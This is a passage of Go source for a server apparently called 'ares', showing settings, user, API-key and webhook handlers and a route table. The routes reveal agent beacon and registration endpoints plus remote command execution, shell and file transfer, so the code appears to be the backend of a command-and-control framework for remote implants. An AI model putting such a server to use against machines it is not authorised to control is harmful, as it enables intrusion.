		Name string `json:"name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if payload.Name == "" {
		http.Error(w, "Missing name", http.StatusBadRequest)
		return
	}

	keyBytes := make([]byte, 16)
	if _, err := rand.Read(keyBytes); err != nil {
		http.Error(w, "Failed to generate key", http.StatusInternalServerError)
		return
	}

	newKey := APIKey{
		Name:      payload.Name,
		Key:       hex.EncodeToString(keyBytes),
		CreatedAt: time.Now(),
	}
	if err := db.Create(&newKey).Error; err != nil {
		http.Error(w, "Failed to save api key", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(newKey)
}

func handleDeleteAPIKey(w http.ResponseWriter, r *http.Request) {
	idParam := mux.Vars(r)["id"]
	id, err := strconv.ParseUint(idParam, 10, 64)
	if err != nil {
		http.Error(w, "Invalid API key id", http.StatusBadRequest)
		return
	}

	result := db.Delete(&APIKey{}, id)
	if result.Error != nil {
		http.Error(w, "Failed to delete api key", http.StatusInternalServerError)
		return
	}
	if result.RowsAffected == 0 {
		http.Error(w, "API key not found", http.StatusNotFound)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

func handleListWebhooks(w http.ResponseWriter, r *http.Request) {
	var hooks []Webhook
	if err := db.Order("id asc").Find(&hooks).Error; err != nil {
		http.Error(w, "Failed to load webhooks", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(hooks)
}

func handleCreateWebhook(w http.ResponseWriter, r *http.Request) {
	var payload struct {
		Name    string `json:"name"`
		URL     string `json:"url"`
		Enabled bool   `json:"enabled"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if payload.Name == "" || payload.URL == "" {
		http.Error(w, "Missing required fields", http.StatusBadRequest)
		return
	}

	newWebhook := Webhook{
		Name:      payload.Name,
		URL:       payload.URL,
		Enabled:   payload.Enabled,
		CreatedAt: time.Now(),
	}
	if err := db.Create(&newWebhook).Error; err != nil {
		http.Error(w, "Failed to save webhook", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(newWebhook)
}

func handleUpdateWebhook(w http.ResponseWriter, r *http.Request) {
	idParam := mux.Vars(r)["id"]
	id, err := strconv.ParseUint(idParam, 10, 64)
	if err != nil {
		http.Error(w, "Invalid webhook id", http.StatusBadRequest)
		return
	}

	var payload struct {
		Name    string `json:"name"`
		URL     string `json:"url"`
		Enabled bool   `json:"enabled"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	var webhook Webhook
	if err := db.First(&webhook, id).Error; err != nil {
		http.Error(w, "Webhook not found", http.StatusNotFound)
		return
	}

	if payload.Name != "" {
		webhook.Name = payload.Name
	}
	if payload.URL != "" {
		webhook.URL = payload.URL
	}
	webhook.Enabled = payload.Enabled

	if err := db.Save(&webhook).Error; err != nil {
		http.Error(w, "Failed to update webhook", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(webhook)
}

func handleDeleteWebhook(w http.ResponseWriter, r *http.Request) {
	idParam := mux.Vars(r)["id"]
	id, err := strconv.ParseUint(idParam, 10, 64)
	if err != nil {
		http.Error(w, "Invalid webhook id", http.StatusBadRequest)
		return
	}

	result := db.Delete(&Webhook{}, id)
	if result.Error != nil {
		http.Error(w, "Failed to delete webhook", http.StatusInternalServerError)
		return
	}
	if result.RowsAffected == 0 {
		http.Error(w, "Webhook not found", http.StatusNotFound)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

func handleSettingsSystemInfo(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(buildSystemInfo())
}

func handleRestartSystem(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]string{"status": "restart queued"})
}

func handleBackupSystem(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]string{"status": "backup queued"})
}

func handleListUsers(w http.ResponseWriter, r *http.Request) {
	var users []User
	if err := db.Find(&users).Error; err != nil {
		http.Error(w, "Failed to list users", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(users)
}

func handleCreateUser(w http.ResponseWriter, r *http.Request) {
	var payload struct {
		Username string `json:"username"`
		Password string `json:"password"`
		Email    string `json:"email"`
		Role     string `json:"role"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if payload.Username == "" || payload.Password == "" {
		http.Error(w, "Missing required fields", http.StatusBadRequest)
		return
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(payload.Password), bcrypt.DefaultCost)
	if err != nil {
		http.Error(w, "Failed to hash password", http.StatusInternalServerError)
		return
	}

	user := User{
		Username:     payload.Username,
		PasswordHash: string(hashedPassword),
		Email:        payload.Email,
		Role:         payload.Role,
		IsActive:     true,
	}
	if err := db.Create(&user).Error; err != nil {
		http.Error(w, "Failed to create user", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(user)
}

func handleUpdateUser(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing user id", http.StatusBadRequest)
		return
	}

	var payload struct {
		Username string `json:"username"`
		Password string `json:"password"`
		Email    string `json:"email"`
		Role     string `json:"role"`
		IsActive *bool  `json:"is_active"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	var user User
	if err := db.First(&user, id).Error; err != nil {
		http.Error(w, "User not found", http.StatusNotFound)
		return
	}

	if payload.Username != "" {
		user.Username = payload.Username
	}
	if payload.Email != "" {
		user.Email = payload.Email
	}
	if payload.Role != "" {
		user.Role = payload.Role
	}
	if payload.IsActive != nil {
		user.IsActive = *payload.IsActive
	}
	if payload.Password != "" {
		hashedPassword, err := bcrypt.GenerateFromPassword([]byte(payload.Password), bcrypt.DefaultCost)
		if err != nil {
			http.Error(w, "Failed to hash password", http.StatusInternalServerError)
			return
		}
		user.PasswordHash = string(hashedPassword)
	}

	if err := db.Save(&user).Error; err != nil {
		http.Error(w, "Failed to update user", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(user)
}

func handleDeleteUser(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing user id", http.StatusBadRequest)
		return
	}

	if err := db.Delete(&User{}, id).Error; err != nil {
		http.Error(w, "Failed to delete user", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

func handleListLogs(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode([]interface{}{})
}

func handleClearLogs(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusNoContent)
}

func handleExportData(w http.ResponseWriter, r *http.Request) {
	settingsMap, err := loadSettingsMap()
	if err != nil {
		http.Error(w, "Failed to export data", http.StatusInternalServerError)
		return
	}

	var keys []APIKey
	if err := db.Order("id asc").Find(&keys).Error; err != nil {
		http.Error(w, "Failed to export data", http.StatusInternalServerError)
		return
	}

	var hooks []Webhook
	if err := db.Order("id asc").Find(&hooks).Error; err != nil {
		http.Error(w, "Failed to export data", http.StatusInternalServerError)
		return
	}

	exportPayload := map[string]interface{}{
		"settings": settingsMap,
		"api_keys": keys,
		"webhooks": hooks,
	}

	data, err := json.MarshalIndent(exportPayload, "", "  ")
	if err != nil {
		http.Error(w, "Failed to export data", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Disposition", "attachment; filename=\"ares-export.json\"")
	w.Write(data)
}

func handleImportData(w http.ResponseWriter, r *http.Request) {
	var payload struct {
		Settings map[string]interface{} `json:"settings"`
		APIKeys  []APIKey               `json:"api_keys"`
		Webhooks []Webhook              `json:"webhooks"`
	}

	var data []byte
	if err := r.ParseMultipartForm(10 << 20); err == nil {
		file, _, err := r.FormFile("file")
		if err == nil {
			defer file.Close()
			data, err = io.ReadAll(file)
			if err != nil {
				http.Error(w, "Failed to read file", http.StatusBadRequest)
				return
			}
		}
	}

	if len(data) == 0 {
		bodyBytes, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Failed to read payload", http.StatusBadRequest)
			return
		}
		data = bodyBytes
	}

	if err := json.Unmarshal(data, &payload); err != nil {
		http.Error(w, "Invalid import data", http.StatusBadRequest)
		return
	}

	if err := db.Transaction(func(tx *gorm.DB) error {
		if err := tx.Where("1 = 1").Delete(&Setting{}).Error; err != nil {
			return err
		}
		if err := tx.Where("1 = 1").Delete(&APIKey{}).Error; err != nil {
			return err
		}
		if err := tx.Where("1 = 1").Delete(&Webhook{}).Error; err != nil {
			return err
		}

		for key, value := range payload.Settings {
			valueBytes, err := json.Marshal(value)
			if err != nil {
				return err
			}
			if err := tx.Create(&Setting{
				Key:   key,
				Value: string(valueBytes),
			}).Error; err != nil {
				return err
			}
		}

		if len(payload.APIKeys) > 0 {
			for i := range payload.APIKeys {
				payload.APIKeys[i].ID = 0
			}
			if err := tx.Create(&payload.APIKeys).Error; err != nil {
				return err
			}
		}

		if len(payload.Webhooks) > 0 {
			for i := range payload.Webhooks {
				payload.Webhooks[i].ID = 0
			}
			if err := tx.Create(&payload.Webhooks).Error; err != nil {
				return err
			}
		}

		return nil
	}); err != nil {
		http.Error(w, "Failed to import data", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "imported"})
}

func findAgentByIdentifier(identifier string) (Agent, error) {
	var agent Agent
	if id, err := strconv.ParseUint(identifier, 10, 64); err == nil {
		if err := db.First(&agent, uint(id)).Error; err == nil {
			return agent, nil
		}
	}

	if err := db.Where("uuid = ?", identifier).First(&agent).Error; err != nil {
		return Agent{}, err
	}

	return agent, nil
}

func setupRoutes() *mux.Router {
	r := mux.NewRouter()

	// API routes
	api := r.PathPrefix("/api/v1").Subrouter()

	// Authentication
	api.HandleFunc("/auth/login", handleLogin).Methods("POST")
	api.HandleFunc("/auth/logout", handleLogout).Methods("POST")

	// Agent endpoints (no auth required)
	api.HandleFunc("/agent/register", handleAgentRegister).Methods("POST")
	api.HandleFunc("/agent/beacon", handleAgentBeacon).Methods("GET")
	api.HandleFunc("/agent/task/result", handleTaskResult).Methods("POST")

	// Protected routes (require auth)
	protected := api.PathPrefix("").Subrouter()
	protected.Use(authMiddleware)

	protected.HandleFunc("/agents", handleListAgents).Methods("GET")
	protected.HandleFunc("/agents/{id}", handleGetAgent).Methods("GET")
	protected.HandleFunc("/agents/{id}", handleDeleteAgent).Methods("DELETE")
	protected.HandleFunc("/agents/{id}/tasks", handleAgentTasks).Methods("GET")
	protected.HandleFunc("/agents/{id}/files", handleListAgentFiles).Methods("GET")
	protected.HandleFunc("/agents/{id}/execute", handleExecuteCommand).Methods("POST")
	protected.HandleFunc("/agents/{id}/shell", handleShellInfo).Methods("GET")
	protected.HandleFunc("/tasks", handleCreateTask).Methods("POST")
	protected.HandleFunc("/tasks", handleListTasks).Methods("GET")
	protected.HandleFunc("/tasks/{id}", handleGetTask).Methods("GET")
	protected.HandleFunc("/tasks/{id}/cancel", handleCancelTask).Methods("POST")
	protected.HandleFunc("/files/upload", handleFileUpload).Methods("POST")
	protected.HandleFunc("/files/{id}/download", handleFileDownload).Methods("GET")
	protected.HandleFunc("/files/{id}", handleDeleteFile).Methods("DELETE")
	protected.HandleFunc("/system/info", handleSystemInfo).Methods("GET")
	protected.HandleFunc("/activity", handleActivity).Methods("GET")
	protected.HandleFunc("/settings", handleGetSettings).Methods("GET")
	protected.HandleFunc("/settings", handleUpdateSettings).Methods("PUT")
	protected.HandleFunc("/settings/api-keys", handleListAPIKeys).Methods("GET")
	protected.HandleFunc("/settings/api-keys", handleCreateAPIKey).Methods("POST")
	protected.HandleFunc("/settings/api-keys/{id}", handleDeleteAPIKey).Methods("DELETE")
	protected.HandleFunc("/settings/webhooks", handleListWebhooks).Methods("GET")
	protected.HandleFunc("/settings/webhooks", handleCreateWebhook).Methods("POST")
	protected.HandleFunc("/settings/webhooks/{id}", handleUpdateWebhook).Methods("PUT")
	protected.HandleFunc("/settings/webhooks/{id}", handleDeleteWebhook).Methods("DELETE")
	protected.HandleFunc("/settings/system-info", handleSettingsSystemInfo).Methods("GET")
	protected.HandleFunc("/settings/restart", handleRestartSystem).Methods("POST")
	protected.HandleFunc("/settings/backup", handleBackupSystem).Methods("POST")
	protected.HandleFunc("/settings/users", handleListUsers).Methods("GET")
	protected.HandleFunc("/settings/users", handleCreateUser).Methods("POST")
	protected.HandleFunc("/settings/users/{id}", handleUpdateUser).Methods("PUT")
	protected.HandleFunc("/settings/users/{id}", handleDeleteUser).Methods("DELETE")
	protected.HandleFunc("/settings/logs", handleListLogs).Methods("GET")
	protected.HandleFunc("/settings/logs", handleClearLogs).Methods("DELETE")
	protected.HandleFunc("/settings/export", handleExportData).Methods("GET")
	protected.HandleFunc("/settings/import", handleImportData).Methods("POST")

	// WebSocket
	r.HandleFunc("/ws", serveWebSocket)
	r.HandleFunc("/ws/terminal/{id}", serveTerminalWebSocket)

	// Health check
	r.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]string{"status": "healthy"})
	}).Methods("GET")

	// Serve frontend
	r.PathPrefix("/").Handler(http.FileServer(http.FS(frontendFS)))

	return r
}

func authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		token := r.Header.Get("Authorization")
		if token == "" {
			token = r.URL.Query().Get("token")
		}

		if token == "" || !strings.HasPrefix(token, "Bearer ") {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		token = strings.TrimPrefix(token, "Bearer ")

		// Validate token
		userID, err := validateToken(token)
		if err != nil {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		ctx := context.WithValue(r.Context(), authUserIDKey, userID)
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}

func loadConfig() {
	// Load configuration from environment variables or config file
	// Simplified for example
	config.Server.Host = os.Getenv("SERVER_HOST")
	if config.Server.Host == "" {
		config.Server.Host = "0.0.0.0"
	}

	config.Server.Port = 8080
	config.Server.EnableTLS = os.Getenv("ENABLE_TLS") == "true"
	config.Security.JWTSecret = os.Getenv("JWT_SECRET")
	config.Security.AdminUsername = os.Getenv("ADMIN_USERNAME")
	config.Security.AdminPassword = os.Getenv("ADMIN_PASSWORD")
	config.Server.UploadDir = os.Getenv("UPLOAD_DIR")
	if config.Server.UploadDir == "" {
		config.Server.UploadDir = "uploads"
	}

	// Database configuration
	config.Database.Host = os.Getenv("DB_HOST")
	config.Database.Port = 5432
	config.Database.Name = os.Getenv("DB_NAME")
	config.Database.User = os.Getenv("DB_USER")
	config.Database.Pass = os.Getenv("DB_PASSWORD")
}

func initDatabase() {
	dsn := fmt.Sprintf("host=%s user=%s password=%s dbname=%s port=%d sslmode=disable",
		config.Database.Host, config.Database.User, config.Database.Pass,
		config.Database.Name, config.Database.Port)

	var err error
	db, err = gorm.Open(postgres.Open(dsn), &gorm.Config{})
	if err != nil {
		logger.Fatalf("Failed to connect to database: %v", err)
	}

	// Auto migrate
	db.AutoMigrate(&User{}, &Agent{}, &Task{}, &File{}, &Setting{}, &APIKey{}, &Webhook{})

	// Create admin user if not exists
	var adminUser User
	result := db.Where("username = ?", config.Security.AdminUsername).First(&adminUser)
	if result.Error == gorm.ErrRecordNotFound {
		hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(config.Security.AdminPassword), bcrypt.DefaultCost)
		adminUser = User{
			Username:     config.Security.AdminUsername,
			PasswordHash: string(hashedPassword),
			Email:        "admin@ares.local",
			Role:         "admin",
			IsActive:     true,
		}
		db.Create(&adminUser)
		logger.Info("Created admin user")
	}
}

func initLogger() {
	logger = logrus.New()
	logger.SetFormatter(&logrus.JSONFormatter{})
	logger.SetOutput(os.Stdout)

	level := os.Getenv("LOG_LEVEL")
	if level == "" {
		level = "info"
	}

	logLevel, err := logrus.ParseLevel(level)
	if err != nil {
		logLevel = logrus.InfoLevel
	}
	logger.SetLevel(logLevel)
}

func main() {
	serverStarted = time.Now()
	initLogger()
	loadConfig()
	initDatabase()

	hub = NewHub()
	go hub.Run()

	router := setupRoutes()

	server := &http.Server{
		Addr:         fmt.Sprintf("%s:%d", config.Server.Host, config.Server.Port),
		Handler:      router,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	if config.Server.EnableTLS {
		server.TLSConfig = &tls.Config{
			MinVersion:               tls.VersionTLS12,
			CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
			PreferServerCipherSuites: true,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		}
	}

	// Graceful shutdown
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

	go func() {
		logger.Infof("Starting server on %s", server.Addr)
		var err error
		if config.Server.EnableTLS {
			err = server.ListenAndServeTLS(config.Server.TLSCertPath, config.Server.TLSKeyPath)
		} else {
			err = server.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			logger.Fatalf("Server failed: %v", err)
		}
	}()

	<-stop

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	if err := server.Shutdown(ctx); err != nil {
		logger.Printf("Graceful shutdown failed: %v", err)
	}

	logger.Info("Server stopped gracefully")
}
